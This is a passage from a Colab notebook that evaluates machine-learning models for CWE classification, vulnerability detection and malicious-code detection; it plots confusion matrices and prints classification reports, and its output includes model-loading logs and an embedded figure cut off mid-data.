        "    plot_confusion_matrix(y_true_final_classes, y_pred_final_classes, class_names_final, title='Confusion Matrix for model_final (Vulnerability Detection)')\n",
        "\n",
        "    # Print classification report\n",
        "    print(\"\\nClassification Report for model_final:\")\n",
        "    # Pass explicit target_names as a list of strings\n",
        "    print(classification_report(y_true_final_classes, y_pred_final_classes, target_names=class_names_final))\n",
        "\n",
        "else:\n",
        "    print(\"Required variables (model_final, test data, label_encoder_final) for model_final analysis not found. Skipping.\")\n",
        "\n",
        "\n",
        "# --- Confusion Matrix for model_mal (df_mal dataset - Malicious Code Detection) ---\n",
        "print(\"\\n--- Confusion Matrix for model_mal (Malicious Code Detection) ---\")\n",
        "# Check if model and required test data are loaded/available\n",
        "if model_mal is not None and 'X_test_mal' in locals() and 'y_test_mal' in locals() and label_encoder_mal is not None:\n",
        "\n",
        "    # Get predictions (probabilities for binary classification)\n",
        "    y_pred_mal_probs = model_mal.predict(X_test_mal)\n",
        "    # Convert probabilities to binary predictions (0 or 1)\n",
        "    y_pred_mal_classes = (y_pred_mal_probs > 0.5).astype(int)\n",
        "\n",
        "    # y_test_mal is already encoded numerical labels (0 or 1)\n",
        "    y_true_mal_classes = y_test_mal\n",
        "\n",
        "    # Convert numerical labels back to original class names ('benign', 'malicious') for plotting\n",
        "    # Ensure the classes in label_encoder_mal are in the correct order\n",
        "    class_names_mal = label_encoder_mal.classes_\n",
        "\n",
        "\n",
        "    # Plot confusion matrix\n",
        "    plot_confusion_matrix(y_true_mal_classes, y_pred_mal_classes, class_names_mal, title='Confusion Matrix for model_mal (Malicious Code Detection)')\n",
        "\n",
        "    # Print classification report\n",
        "    print(\"\\nClassification Report for model_mal:\")\n",
        "    print(classification_report(y_true_mal_classes, y_pred_mal_classes, target_names=class_names_mal))\n",
        "\n",
        "else:\n",
        "    print(\"Required variables (model_mal, test data, label_encoder_mal) for model_mal analysis not found. Skipping.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "id": "eJIoiQUEu3xQ",
        "outputId": "a87d9ad9-9cd9-4f39-a217-2a62bec7ae89"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "model_full loaded successfully from /content/drive/MyDrive/fortmp/model/model_full_20250918_063532.pkl\n",
            "label_encoder_full loaded successfully from /content/drive/MyDrive/fortmp/model/label_encoder_full_20250918_063532.pkl\n",
            "model_final loaded successfully from /content/drive/MyDrive/fortmp/model/model_final_20250918_063532.pkl\n",
            "label_encoder_final loaded successfully from /content/drive/MyDrive/fortmp/model/label_encoder_final_20250918_063532.pkl\n",
            "model_mal loaded successfully from /content/drive/MyDrive/fortmp/model/model_mal.pkl\n",
            "label_encoder_mal loaded successfully from /content/drive/MyDrive/fortmp/model/label_encoder_mal.pkl\n",
            "--- Confusion Matrix for model_full (CWE Classification) ---\n",
            "\u001b[1m25/25\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 8ms/step\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 800x600 with 2 Axes>"
            ],
            "image/png": "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